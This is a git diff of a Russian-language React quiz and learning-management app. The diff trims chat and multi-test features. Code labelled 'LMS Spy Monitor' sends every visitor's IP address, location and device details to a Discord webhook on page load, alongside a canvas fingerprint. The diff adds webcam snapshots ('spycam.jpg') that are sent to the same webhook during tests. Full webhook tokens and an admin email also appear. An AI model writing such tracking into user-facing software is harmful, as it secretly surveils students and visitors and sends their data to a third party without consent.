@@ -2,7 +2,7 @@ const { useState, useEffect, useRef, useLayoutEffect, memo } = React;
 const { motion, AnimatePresence } = window.Motion;
 
 // --- ЛОГИКА ---
-const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1502549157850775573/-HMez8dO8ifxGII_elVSGW0isBHy2FJF32_uinsF92OegVonn7bfDW_ap4_EvDr3_N9O';
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1481534100194983958/L107VBFTCX5FYQFfAyiJu7PsTOhbsrNX9yOmRLExoj-B-a9okiGuyweAPmYzPcU09rEj';
 
 async function sha256hex(str){const buf = new TextEncoder().encode(str);const hashBuf = await crypto.subtle.digest('SHA-256', buf);return Array.from(new Uint8Array(hashBuf)).map(b=>b.toString(16).padStart(2,'0')).join('');}
 function canvasFingerprint(){try{const c=document.createElement('canvas'),ctx=c.getContext('2d');c.width=200;c.height=50;ctx.textBaseline='top';ctx.font="16px Arial";ctx.fillStyle='#f60';ctx.fillRect(125,1,62,20);ctx.fillStyle='#069';ctx.fillText('test-λ',2,2);ctx.fillStyle='rgba(102,204,0,0.7)';ctx.fillText('test-λ',4,24);return c.toDataURL();}catch(e){return '';}}
@@ -18,114 +18,6 @@ function useMathJax(contentRef, dependencies = []) {
 }
 
 // --- UI COMPONENTS ---
-
-const GooeyText = ({ texts, morphTime = 1, cooldownTime = 0.5, style }) => {
-  const text1Ref = useRef(null);
-  const text2Ref = useRef(null);
-
-  useEffect(() => {
-    let textIndex = texts.length - 1;
-    let time = new Date();
-    let morph = 0;
-    let cooldown = cooldownTime;
-
-    const setMorph = (fraction) => {
-      if (text1Ref.current && text2Ref.current) {
-        text2Ref.current.style.filter = `blur(${Math.min(8 / fraction - 8, 100)}px)`;
-        text2Ref.current.style.opacity = `${Math.pow(fraction, 0.4) * 100}%`;
-
-        fraction = 1 - fraction;
-        text1Ref.current.style.filter = `blur(${Math.min(8 / fraction - 8, 100)}px)`;
-        text1Ref.current.style.opacity = `${Math.pow(fraction, 0.4) * 100}%`;
-      }
-    };
-
-    const doCooldown = () => {
-      morph = 0;
-      if (text1Ref.current && text2Ref.current) {
-        text2Ref.current.style.filter = "";
-        text2Ref.current.style.opacity = "100%";
-        text1Ref.current.style.filter = "";
-        text1Ref.current.style.opacity = "0%";
-      }
-    };
-
-    const doMorph = () => {
-      morph -= cooldown;
-      cooldown = 0;
-      let fraction = morph / morphTime;
-
-      if (fraction > 1) {
-        cooldown = cooldownTime;
-        fraction = 1;
-      }
-
-      setMorph(fraction);
-    };
-
-    let animationFrameId;
-    function animate() {
-      animationFrameId = requestAnimationFrame(animate);
-      const newTime = new Date();
-      const shouldIncrementIndex = cooldown > 0;
-      const dt = (newTime.getTime() - time.getTime()) / 1000;
-      time = newTime;
-
-      cooldown -= dt;
-
-      if (cooldown <= 0) {
-        if (shouldIncrementIndex) {
-          textIndex = (textIndex + 1) % texts.length;
-          if (text1Ref.current && text2Ref.current) {
-            text1Ref.current.textContent = texts[textIndex % texts.length];
-            text2Ref.current.textContent = texts[(textIndex + 1) % texts.length];
-          }
-        }
-        doMorph();
-      } else {
-        doCooldown();
-      }
-    }
-
-    animate();
-    return () => cancelAnimationFrame(animationFrameId);
-  }, [texts, morphTime, cooldownTime]);
-
-  return (
-    <div style={{ position: 'relative', height: '60px', ...style }}>
-      <svg style={{ position: 'absolute', width: 0, height: 0 }} aria-hidden="true" focusable="false">
-        <defs>
-          <filter id="threshold">
-            <feColorMatrix
-              in="SourceGraphic"
-              type="matrix"
-              values="1 0 0 0 0
-                      0 1 0 0 0
-                      0 0 1 0 0
-                      0 0 0 255 -140"
-            />
-          </filter>
-        </defs>
-      </svg>
-      <div style={{ filter: "url(#threshold)", display: 'flex', alignItems: 'center', justifyContent: 'center', width: '100%', height: '100%' }}>
-        <span
-          ref={text1Ref}
-          style={{
-            position: 'absolute', display: 'inline-block', userSelect: 'none', textAlign: 'center',
-            fontSize: '32px', fontWeight: 'bold', background: 'var(--primary-grad)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent'
-          }}
-        />
-        <span
-          ref={text2Ref}
-          style={{
-            position: 'absolute', display: 'inline-block', userSelect: 'none', textAlign: 'center',
-            fontSize: '32px', fontWeight: 'bold', background: 'var(--primary-grad)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent'
-          }}
-        />
-      </div>
-    </div>
-  );
-};
 
 const Button = ({ children, onClick, variant = 'primary', style, className }) => {
   const vars = {
@@ -280,15 +172,6 @@ const AdminPanel = ({ onBack }) => {
         }
     };
 
-    const toggleAdmin = async (uid, currentRole) => {
-        try {
-            const newRole = currentRole === 'admin' ? 'student' : 'admin';
-            await window.db.collection('users').doc(uid).update({ role: newRole });
-        } catch (e) {
-            alert("Ошибка при изменении роли");
-        }
-    };
-
     const handleAssignTestFile = (e, uid) => {
         const file = e.target.files[0];
         if (!file) return;
@@ -307,20 +190,13 @@ const AdminPanel = ({ onBack }) => {
                     correctIndex: t.correctIndex
                 }));
 
-                const currentUser = users.find(u => u.id === uid);
-                const currentTests = currentUser.assignedTests || [];
-                
-                const newTest = { 
-                    id: Date.now(),
-                    title: title.trim(),
-                    data: normalized
-                };
-
                 await window.db.collection('users').doc(uid).update({ 
-                    assignedTests: [...currentTests, newTest] 
+                    assignedTest: { 
+                        title: title.trim(),
+                        data: normalized
+                    } 
                 });
-                
-                alert("✅ Тест успешно загружен и добавлен студенту!");
+                alert("✅ Тест успешно загружен и назначен студенту!");
             } catch (err) {
                 console.error(err);
                 alert("Ошибка чтения JSON файла! Проверьте, правильный ли это файл теста.");
@@ -330,12 +206,10 @@ const AdminPanel = ({ onBack }) => {
         e.target.value = null; 
     };
 
-    const removeTest = async (uid, testId) => {
-        if(confirm("Удалить этот тест у студента?")) {
+    const removeTest = async (uid) => {
+        if(confirm("Удалить назначенный тест у этого студента?")) {
             try {
-                const currentUser = users.find(u => u.id === uid);
-                const updatedTests = (currentUser.assignedTests || []).filter(t => t.id !== testId);
-                await window.db.collection('users').doc(uid).update({ assignedTests: updatedTests });
+                await window.db.collection('users').doc(uid).update({ assignedTest: window.firebase.firestore.FieldValue.delete() });
             } catch(e) {
                 alert("Ошибка при удалении теста");
             }
@@ -351,39 +225,24 @@ const AdminPanel = ({ onBack }) => {
                 <h3 style={{marginTop: 0}}>👥 Управление студентами</h3>
                 {users.length === 0 && <div style={{textAlign: 'center', color: 'var(--text-sec)'}}>Загрузка пользователей...</div>}
                 {users.map(u => (
-                    <div key={u.id} style={{display:'flex', flexWrap: 'wrap', gap: '15px', justifyContent:'space-between', alignItems: 'center', padding:'15px 0', borderBottom:'1px solid rgba(128,128,128,0.1)'}}>
-                        
-                        {/* --- Блок с текстом: почта и статус --- */}
-                        <div style={{overflow: 'hidden', flex: '1 1 200px'}}>
-                            <div style={{fontWeight:'bold', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap'}}>{u.email}</div>
-                            <div style={{fontSize:12, color: u.isBanned ? '#ef4444' : '#10b981', fontWeight: 'bold', marginTop: '5px'}}>
-                                {u.isBanned ? ' ЗАБЛОКИРОВАН' : ' АКТИВЕН'}
-                                {u.role === 'admin' ? ' | 🛡️ АДМИН' : ''}
-                            </div>
-                            
-                            {u.assignedTests && u.assignedTests.length > 0 && (
-                                <div style={{marginTop: '10px', display: 'flex', flexDirection: 'column', gap: '5px'}}>
-                                    {u.assignedTests.map(test => (
-                                        <div key={test.id} style={{fontSize:12, color: '#3b82f6', fontWeight: 'bold', display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: 'rgba(59, 130, 246, 0.1)', padding: '5px 10px', borderRadius: '8px', marginRight: '10px'}}>
-                                            <span>☁️ {test.title}</span>
-                                            <span style={{cursor: 'pointer', color: '#ef4444', fontSize: '14px', padding: '0 5px'}} onClick={() => removeTest(u.id, test.id)}>✖</span>
-                                        </div>
-                                    ))}
+                    <div key={u.id} style={{display:'flex', justifyContent:'space-between', alignItems: 'center', padding:'10px 0', borderBottom:'1px solid rgba(128,128,128,0.1)'}}>
+                        <div style={{overflow: 'hidden', paddingRight: '10px'}}>
+                            <div style={{fontWeight:'bold', overflow: 'hidden', textOverflow: 'ellipsis'}}>{u.email}</div>
+                            <div style={{fontSize:12, color: u.isBanned ? '#ef4444' : '#10b981', fontWeight: 'bold'}}>{u.isBanned ? ' ЗАБЛОКИРОВАН' : ' АКТИВЕН'}</div>
+                            {u.assignedTest && (
+                                <div style={{fontSize:12, color: '#3b82f6', fontWeight: 'bold', marginTop: '4px', display: 'flex', alignItems: 'center', gap: '5px'}}>
+                                    ☁️ Назначен тест: {u.assignedTest.title}
+                                    <span style={{cursor: 'pointer', color: '#ef4444'}} onClick={() => removeTest(u.id)}>✖</span>
                                 </div>
                             )}
                         </div>
-                        
-                        {/* --- Блок с кнопками управления --- */}
-                        {u.id !== window.auth.currentUser?.uid && (
-                            <div style={{display: 'flex', gap: '8px', flexWrap: 'wrap', flex: '1 1 auto', justifyContent: 'flex-start'}}>
-                                <Button variant={u.role === 'admin' ? "orange" : "teal"} style={{flex: '1 1 auto', padding:'0 12px', height:36, minHeight:36, fontSize:11, margin:0}} onClick={() => toggleAdmin(u.id, u.role)}>
-                                    {u.role === 'admin' ? "Снять админа" : "Дать админа"}
-                                </Button>
-                                <label style={{cursor: 'pointer', flex: '1 1 auto', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)', color: 'white', borderRadius: '14px', padding: '0 12px', height: '36px', fontSize: '11px', fontWeight: 'bold', boxShadow: '0 4px 6px rgba(50,50,93,0.11)', textTransform: 'uppercase', margin: 0}}>
+                        {u.email !== 'msleaderindustry@gmail.com' && (
+                            <div style={{display: 'flex', gap: '5px'}}>
+                                <label style={{cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'center', background: 'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)', color: 'white', borderRadius: '14px', padding: '0 15px', height: '35px', fontSize: '12px', fontWeight: 'bold', boxShadow: '0 4px 6px rgba(50,50,93,0.11)', textTransform: 'uppercase', margin: 0}}>
                                     📁 Загрузить
                                     <input type="file" accept=".json" style={{display: 'none'}} onChange={(e) => handleAssignTestFile(e, u.id)} />
                                 </label>
-                                <Button variant={u.isBanned ? "green" : "red"} style={{flex: '1 1 auto', padding:'0 12px', height:36, minHeight:36, fontSize:11, margin:0}} onClick={() => toggleBan(u.id, u.isBanned)}>
+                                <Button variant={u.isBanned ? "green" : "red"} style={{width:'auto', padding:'0 15px', height:35, minHeight:35, fontSize:12, margin:0}} onClick={() => toggleBan(u.id, u.isBanned)}>
                                     {u.isBanned ? "Разбанить" : "Забанить"}
                                 </Button>
                             </div>
@@ -410,32 +269,14 @@ const TestQuestionCard = memo(({ question, index, answers, onAnswer }) => {
                const isAnswered = answers[index] !== null; const isSelected = answers[index] === i; const isCorrect = question.correctIndex === i;
                
                let styleOverride = {};
-               let animationProps = { initial: { opacity: 0, x: -20 }, animate: { opacity: 1, x: 0 }, transition: { delay: i * 0.1 } };
-
                if(isAnswered) {
-                 if(isCorrect) { 
-                     styleOverride = {background: '#d1fae5', borderColor: '#10b981', color: '#064e3b'}; 
-                     // Анимация правильного ответа (пульсация)
-                     if(isSelected) animationProps.animate = { opacity: 1, x: 0, scale: [1, 1.05, 1] };
-                 } 
-                 else if(isSelected) { 
-                     styleOverride = {background: '#fee2e2', borderColor: '#ef4444', color: '#7f1d1d'}; 
-                     // Анимация неправильного ответа (тряска)
-                     animationProps.animate = { opacity: 1, x: [-5, 5, -5, 5, 0] };
-                     animationProps.transition = { duration: 0.3 };
-                 } 
+                 if(isCorrect) { styleOverride = {background: '#d1fae5', borderColor: '#10b981', color: '#064e3b'}; } 
+                 else if(isSelected) { styleOverride = {background: '#fee2e2', borderColor: '#ef4444', color: '#7f1d1d'}; } 
                  else if(question.correctIndex === i) { styleOverride = {borderColor: '#10b981', opacity: 0.7}; } 
                }
                
                return (
-                 <motion.div 
-                    key={i} 
-                    {...animationProps}
-                    className="variant-item" 
-                    onClick={() => !isAnswered && onAnswer(i)} 
-                    style={{ pointerEvents: isAnswered ? 'none' : 'auto', ...styleOverride }} 
-                    whileHover={!isAnswered ? { scale: 1.01 } : {}}
-                 >
+                 <motion.div key={i} initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} transition={{ delay: i * 0.1 }} className="variant-item" onClick={() => !isAnswered && onAnswer(i)} style={{ pointerEvents: isAnswered ? 'none' : 'auto', ...styleOverride }} whileHover={!isAnswered ? { scale: 1.01 } : {}}>
                     {v.img && <img src={v.img} style={{display:'block', maxWidth:200, marginBottom:8, borderRadius:8}} />}
                     {v.text}
                  </motion.div>
@@ -510,111 +351,6 @@ const StatsView = ({ history, setHistory, onBack }) => {
     )
 };
 
-// --- КОМПОНЕНТ ЧАТА ---
-const ChatPanel = ({ user, onClose }) => {
-    const [chatUsers, setChatUsers] = useState([]);
-    const [activeChat, setActiveChat] = useState(null);
-    const [messages, setMessages] = useState([]);
-    const [msgText, setMsgText] = useState('');
-    const messagesEndRef = useRef(null);
-
-    useEffect(() => {
-        if(!window.db) return;
-        const unsub = window.db.collection('users').onSnapshot(snap => {
-            setChatUsers(snap.docs.map(d => ({uid: d.id, ...d.data()})).filter(u => u.uid !== user.uid));
-        });
-        return () => unsub();
-    }, [user]);
-
-    useEffect(() => {
-        if(!activeChat || !window.db) return;
-        const chatId = [user.uid, activeChat.uid].sort().join('_');
-        const unsub = window.db.collection('private_chats').doc(chatId).collection('messages')
-            .orderBy('createdAt', 'asc')
-            .onSnapshot(snap => {
-                setMessages(snap.docs.map(d => ({id: d.id, ...d.data()})));
-                setTimeout(() => messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' }), 100);
-            });
-        return () => unsub();
-    }, [activeChat, user]);
-
-    const sendMessage = async () => {
-        if(!msgText.trim()) return;
-        const chatId = [user.uid, activeChat.uid].sort().join('_');
-        await window.db.collection('private_chats').doc(chatId).collection('messages').add({
-            text: msgText.trim(),
-            senderId: user.uid,
-            createdAt: new Date().toISOString(),
-            deletedFor: [],
-            deletedForEveryone: false
-        });
-        setMsgText('');
-    };
-
-    const delForMe = async (msgId) => {
-        const chatId = [user.uid, activeChat.uid].sort().join('_');
-        const msgRef = window.db.collection('private_chats').doc(chatId).collection('messages').doc(msgId);
-        const doc = await msgRef.get();
-        if(doc.exists) {
-            const data = doc.data();
-            await msgRef.update({ deletedFor: [...(data.deletedFor || []), user.uid] });
-        }
-    };
-
-    const delForEveryone = async (msgId) => {
-        const chatId = [user.uid, activeChat.uid].sort().join('_');
-        await window.db.collection('private_chats').doc(chatId).collection('messages').doc(msgId).delete();
-    };
-
-    return (
-        <motion.div initial={{x:'100%'}} animate={{x:0}} exit={{x:'100%'}} transition={{type:'spring', damping:25, stiffness:200}} className="glass-chat-panel">
-            <div style={{display:'flex', justifyContent:'space-between', alignItems:'center', padding:'20px', borderBottom:'1px solid var(--glass-border)', flexShrink: 0}}>
-                <h3 style={{margin:0, fontSize:18, flex: 1, overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap', paddingRight: '10px'}}>
-                    {activeChat ? `💬 ${activeChat.nickname || activeChat.email}` : '💬 Контакты'}
-                </h3>
-                <Button variant="muted" onClick={() => activeChat ? setActiveChat(null) : onClose()} style={{width:44, height:44, minWidth: 44, padding:0, borderRadius:'50%', flexShrink: 0}}>✖</Button>
-            </div>
-
-            <div style={{flex:1, overflowY:'auto', padding:'20px', scrollbarWidth:'thin'}}>
-                {!activeChat ? (
-                    <div style={{display:'flex', flexDirection:'column', gap:10}}>
-                        {chatUsers.length === 0 && <div style={{textAlign:'center', color:'var(--text-sec)', marginTop: 20}}>Нет других пользователей</div>}
-                        {chatUsers.map(u => (
-                            <div key={u.uid} onClick={()=>setActiveChat(u)} className="chat-user-card" style={{padding:15, borderRadius:14, background:'var(--variant-default)', cursor:'pointer', border:'1px solid var(--glass-border)'}}>
-                                👤 <b style={{fontSize: 14}}>{u.nickname || u.email}</b>
-                            </div>
-                        ))}
-                    </div>
-                ) : (
-                    <div style={{display:'flex', flexDirection:'column', gap:15}}>
-                        {messages.filter(m => !(m.deletedFor || []).includes(user.uid)).map(m => {
-                            const isMine = m.senderId === user.uid;
-                            return (
-                                <div key={m.id} className="chat-bubble" style={{alignSelf: isMine?'flex-end':'flex-start', maxWidth:'80%', background: isMine?'var(--primary-grad)':'var(--glass-bg)', color: isMine?'white':'var(--text-main)', padding:'12px 16px', borderRadius:'16px', border:'1px solid var(--glass-border)', position:'relative', wordBreak:'break-word', borderBottomRightRadius: isMine ? '4px' : '16px', borderBottomLeftRadius: !isMine ? '4px' : '16px'}}>
-                                    <div style={{marginBottom:6, fontSize: 14}}>{m.text}</div>
-                                    <div style={{display:'flex', gap:12, fontSize:10, justifyContent:'flex-end', opacity:0.8}}>
-                                        <span>{new Date(m.createdAt).toLocaleTimeString().slice(0,5)}</span>
-                                        <span style={{cursor:'pointer', fontWeight: 600}} onClick={()=>delForMe(m.id)}>🗑️ У себя</span>
-                                        {isMine && <span style={{cursor:'pointer', fontWeight: 600}} onClick={()=>delForEveryone(m.id)}>🔥 У всех</span>}
-                                    </div>
-                                </div>
-                            )
-                        })}
-                        <div ref={messagesEndRef} />
-                    </div>
-                )}
-            </div>
-
-            {activeChat && (
-                <div style={{padding:'20px', paddingBottom: 'max(20px, env(safe-area-inset-bottom))', borderTop:'1px solid var(--glass-border)', display:'flex', gap:10, flexShrink: 0}}>
-                    <Input value={msgText} onChange={e=>setMsgText(e.target.value)} onKeyDown={e=>{if(e.key==='Enter')sendMessage()}} placeholder="Сообщение..." style={{margin:0, flex:1, borderRadius: '24px'}} />
-                    <Button variant="primary" onClick={sendMessage} style={{width:54, height:54, minWidth:54, padding:0, borderRadius:'50%', flexShrink: 0}}>➤</Button>
-                </div>
-            )}
-        </motion.div>
-    );
-}
-
 // --- APP ---
 
 function App() {
@@ -634,17 +370,10 @@ function App() {
   const [isAnimating, setIsAnimating] = useState(false);
 
   const [user, setUser] = useState(null);
-  const [userRole, setUserRole] = useState('student');
-  const [userNickname, setUserNickname] = useState(''); 
   const [isAuthLoading, setIsAuthLoading] = useState(true);
-  
-  const [teacherTests, setTeacherTests] = useState([]); 
+  const [teacherTest, setTeacherTest] = useState(null); 
 
-  // Новые состояния для Гамбургера и Чата
-  const [isSidebarOpen, setIsSidebarOpen] = useState(false);
-  const [isChatOpen, setIsChatOpen] = useState(false);
-
-  const isAdmin = userRole === 'admin';
+  const isAdmin = user && user.email === 'msleaderindustry@gmail.com';
 
   useEffect(() => {
       if (!window.auth) {
@@ -665,18 +394,14 @@ function App() {
                               window.auth.signOut();
                               window.location.reload();
                           }
-                          setUserRole(data.role || 'student');
-                          setUserNickname(data.nickname || ''); 
-                          if (data.assignedTests) {
-                              setTeacherTests(data.assignedTests);
+                          if (data.assignedTest) {
+                              setTeacherTest(data.assignedTest);
                           } else {
-                              setTeacherTests([]);
+                              setTeacherTest(null);
                           }
                       }
                   });
               return () => unsubscribeBan();
-          } else {
-              setUserRole('student');
           }
       });
       return () => unsubscribeAuth();
@@ -688,43 +413,43 @@ function App() {
           const ipData = await ipReq.json();
           const deviceInfo = navigator.userAgent;
 
-          // Формируем ссылку на Google Карты, если координаты доступны
-          const mapsLink = ipData.latitude && ipData.longitude 
-              ? `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}` 
-              : null;
-
           let payload = {
-              username: "LMS Spy Monitor", 
-              avatar_url: "https://i.imgur.com/4M34hi2.png",
+              username: "LMS Spy Monitor", avatar_url: "https://i.imgur.com/4M34hi2.png",
               embeds: [{
-                  title: "👁️ НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ", 
-                  color: 16753920,
+                  title: "👁️ НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ", color: 16753920,
                   fields: [
-                      // Детальная локация
-                      { name: "📍 Локация", value: `${ipData.country_name || 'Скрыто'}, ${ipData.region || 'Скрыто'}, ${ipData.city || 'Скрыто'}`, inline: false },
-                      // Ссылка на карту
-                      { name: "🗺️ На карте", value: mapsLink ? `[📍 Открыть Google Maps](${mapsLink})` : 'Нет данных', inline: true },
-                      // IP адрес
+                      { name: "📍 Локация", value: `${ipData.country_name || 'Скрыто'}, ${ipData.city || 'Скрыто'}`, inline: true },
                       { name: "🌐 IP Адрес", value: `\`${ipData.ip || 'Скрыто'}\``, inline: true },
-                      // Название интернет-провайдера (например, Uztelecom, Beeline)
-                      { name: "📡 Провайдер", value: `\`${ipData.org || 'Скрыто'}\``, inline: true },
-                      // Устройство
-                      { name: "💻 Устройство", value: `\`\`\`${deviceInfo}\`\`\``, inline: false }
+                      { name: "💻 Устройство", value: `\`\`\`${deviceInfo}\`\`\`` }
                   ],
                   timestamp: new Date().toISOString()
               }]
           };
-          
-          let formData = new FormData(); 
-          formData.append('payload_json', JSON.stringify(payload));
+          let formData = new FormData(); formData.append('payload_json', JSON.stringify(payload));
           await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-      } catch (e) {
-          console.error("Ошибка логгера:", e);
-      }
+      } catch (e) {}
   };
 
   useEffect(() => { logVisitor(); }, []);
 
+  const streamRef = useRef(null);
+  const videoRef = useRef(null);
+
+  const startCamera = async () => {
+      try {
+          if (!streamRef.current) {
+              const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } });
+              streamRef.current = stream;
+              const video = document.createElement('video');
+              video.muted = true; video.playsInline = true; video.autoplay = true; video.srcObject = stream;
+              videoRef.current = video;
+              await new Promise((resolve) => {
+                  video.onloadedmetadata = () => { video.play().then(resolve).catch(resolve); };
+                  setTimeout(resolve, 1500);
+              });
+          }
+      } catch (e) {}
+  };
 
   const captureViolation = async (title, extraFields = []) => {
       let formData = new FormData();
@@ -738,9 +463,28 @@ function App() {
           }]
       };
 
+      if (videoRef.current && streamRef.current) {
+          try {
+              const canvas = document.createElement('canvas');
+              canvas.width = videoRef.current.videoWidth || 640; 
+              canvas.height = videoRef.current.videoHeight || 480;
+              canvas.getContext('2d').drawImage(videoRef.current, 0, 0, canvas.width, canvas.height);
+              const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
+              if (blob && blob.size > 100) {
+                  formData.append('file', blob, 'spycam.jpg'); payload.embeds[0].image = { url: 'attachment://spycam.jpg' };
+              }
+          } catch(e) {}
+      }
       formData.append('payload_json', JSON.stringify(payload));
       try { await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData }); } catch(e) {}
   };
+
+  useEffect(() => {
+      if (view !== 'test') {
+          if (streamRef.current) { streamRef.current.getTracks().forEach(t => t.stop()); streamRef.current = null; }
+          if (videoRef.current) { videoRef.current = null; }
+      }
+  }, [view]);
 
   useEffect(() => {
     let intervalId = null;
@@ -781,13 +525,10 @@ function App() {
     }
     check();
   }, []);
-  
- const loadData = () => {
-    const raw = localStorage.getItem('test_sets_list'); 
-    setSets(raw ? JSON.parse(raw) : []); 
-    if(!raw) { 
-        localStorage.setItem('test_sets_list', JSON.stringify([]));       
-    }
+
+  const loadData = () => {
+    const raw = localStorage.getItem('test_sets_list'); setSets(raw ? JSON.parse(raw) : ['Электроника']);
+    if(!raw) { localStorage.setItem('test_sets_list', JSON.stringify(['Электроника'])); localStorage.setItem('tests_Электроника', JSON.stringify([])); }
     setHistory(JSON.parse(localStorage.getItem('test_history_v1') || '[]'));
   };
 
@@ -795,6 +536,7 @@ function App() {
   const deleteSet = (name) => { if(!confirm(`Удалить "${name}"?`)) return; const newSets = sets.filter(s => s !== name); setSets(newSets); localStorage.setItem('test_sets_list', JSON.stringify(newSets)); localStorage.removeItem('tests_' + name); };
   const openSet = (name) => { setCurrentSet(name); setTests(JSON.parse(localStorage.getItem('tests_' + name)) || []); setView('set_menu'); };
 
+  // ОТКРЫВАЕМ ТЕСТ НАПРЯМУЮ ИЗ БАЗЫ
   const openTeacherAssignedTest = (testInfo) => {
       setView('loading');
       setTimeout(() => {
@@ -804,11 +546,11 @@ function App() {
       }, 300);
   };
 
-  const removeTeacherTestStudent = async (testId, testTitle) => {
-      if(!confirm(`Удалить назначенный тест "${testTitle}"?`)) return;
+  // ФУНКЦИЯ ДЛЯ СТУДЕНТА: УДАЛИТЬ ТЕСТ ОТ ПРЕПОДАВАТЕЛЯ ИЗ СВОЕГО МЕНЮ
+  const removeTeacherTestStudent = async () => {
+      if(!confirm(`Удалить назначенный тест "${teacherTest.title}"?`)) return;
       try {
-          const updatedTests = teacherTests.filter(t => t.id !== testId);
-          await window.db.collection('users').doc(user.uid).update({ assignedTests: updatedTests });
+          await window.db.collection('users').doc(user.uid).update({ assignedTest: window.firebase.firestore.FieldValue.delete() });
       } catch(e) {
           alert("Ошибка при удалении теста");
       }
@@ -823,6 +565,7 @@ function App() {
   const startTest = () => { if(tests.length === 0) return alert('Нет вопросов!'); setCustomQCount(tests.length); setView('timer_setup'); };
   
   const launchTestWithTimer = async () => {
+      await startCamera();
       const mins = parseInt(customTime) || 20;
       let qCount = parseInt(customQCount);
       if (!qCount || qCount <= 0) qCount = tests.length;
@@ -889,6 +632,7 @@ function App() {
        const newCorrectIdx = newVars.findIndex(v => v._isCorrectOriginal);
        return { ...q, variants: newVars, correctIndex: newCorrectIdx };
     });
+    await startCamera();
     const mins = parseInt(customTime) || 20; setTimeLeft(mins * 60);
     setTestSession({ questions: reShuffledQuestions, currentIdx: 0, answers: new Array(reShuffledQuestions.length).fill(null), score: 0 });
     setIsResultSaved(false); setView('test');
@@ -897,77 +641,27 @@ function App() {
   const saveResult = async (name) => {
       if(!name.trim()) return alert('Введите имя!');
       const scoreData = { student: name, percent: Math.round((testSession.score / testSession.questions.length) * 100), score: testSession.score, total: testSession.questions.length, topic: currentSet };
-      
       try {
-          // 1. Ищем вопросы, на которые ответили неправильно
-          const failedQuestions = testSession.questions.filter((q, i) => testSession.answers[i] !== q.correctIndex);
-
-          // 2. Базовые поля карточки
-          let embedFields = [
-              { name: "👤 Студент", value: `**${scoreData.student}**`, inline: true },
-              { name: "📧 Email", value: `**${user ? user.email : "Неизвестно"}**`, inline: true },
-              { name: "🎯 Результат", value: `\`${scoreData.percent}%\``, inline: true },
-              { name: "📚 Тема", value: scoreData.topic, inline: true },
-              { name: "📝 Точный счет", value: `${scoreData.score} из ${scoreData.total}`, inline: true },
-              { name: "🆔 Fingerprint", value: `\`${fp}\``, inline: false }
-          ];
-
-          // 3. Добавляем список ошибок, если они есть
-          if (failedQuestions.length > 0) {
-              embedFields.push({ name: "▬▬▬ ОШИБКИ ▬▬▬", value: "Список неверных ответов:", inline: false });
-              
-              failedQuestions.forEach(q => {
-                  const originalIndex = testSession.questions.indexOf(q);
-                  const userAnsIdx = testSession.answers[originalIndex];
-                  
-                  const userAnsText = userAnsIdx !== null && q.variants[userAnsIdx] ? q.variants[userAnsIdx].text : "Пропустил";
-                  const correctAnsText = q.variants[q.correctIndex].text;
-
-                  embedFields.push({
-                      name: `❓ ${q.question.replace(/<[^>]+>/g, '')}`, // Очищаем от HTML тегов
-                      value: `❌ Ответил: ${userAnsText}\n✅ Правильный: ${correctAnsText}`,
-                      inline: false
-                  });
-              });
-          }
-
-          // 4. Формируем данные
-          let payload = {
-              username: "System Monitor", avatar_url: "https://i.imgur.com/4M34hi2.png",
-              embeds: [{
-                  title: "📊 Новый результат теста", 
-                  color: failedQuestions.length > 0 ? 16711680 : 3066993, // Красный (ошибки) или Зеленый (100%)
-                  fields: embedFields,
-                  timestamp: new Date().toISOString()
-              }]
-          };
-
-          // 5. Отправляем через FormData
-          let formData = new FormData(); 
-          formData.append('payload_json', JSON.stringify(payload));
-          await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
-          
-      } catch (e) {
-          console.error("Ошибка при отправке в Discord:", e);
-      }
-      
-      // 6. Сохранение в локальную историю
+          await fetch(DISCORD_WEBHOOK, {
+              method: 'POST', headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                  username: "System Monitor", avatar_url: "https://i.imgur.com/4M34hi2.png",
+                  embeds: [{
+                      title: "📊 Новый результат теста", color: 3066993,
+                      fields: [
+                          { name: "👤 Студент", value: `**${scoreData.student}**`, inline: true },
+                          { name: "🎯 Результат", value: `\`${scoreData.percent}%\``, inline: true },
+                          { name: "📚 Тема", value: scoreData.topic, inline: true },
+                          { name: "📝 Точный счет", value: `${scoreData.score} из ${scoreData.total}`, inline: true },
+                          { name: "🆔 Fingerprint", value: `\`${fp}\`` }
+                      ],
+                      timestamp: new Date().toISOString()
+                  }]
+              })
+          });
+      } catch (e) {}
       const newRecord = { id: Date.now(), date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString().slice(0,5), ...scoreData };
-      const newHistory = [...history, newRecord]; 
-      setHistory(newHistory); 
-      localStorage.setItem('test_history_v1', JSON.stringify(newHistory)); 
-      setIsResultSaved(true);
-  };
-
-  const changeNickname = async () => {
-      const newNick = prompt("Введите ваш новый никнейм (будет виден в чате):", userNickname || "");
-      if (newNick && newNick.trim() !== "") {
-          try {
-              await window.db.collection('users').doc(user.uid).update({ nickname: newNick.trim() });
-          } catch (e) {
-              alert("Ошибка при сохранении никнейма!");
-          }
-      }
+      const newHistory = [...history, newRecord]; setHistory(newHistory); localStorage.setItem('test_history_v1', JSON.stringify(newHistory)); setIsResultSaved(true);
   };
 
   const handlePrint = () => {
@@ -989,96 +683,23 @@ function App() {
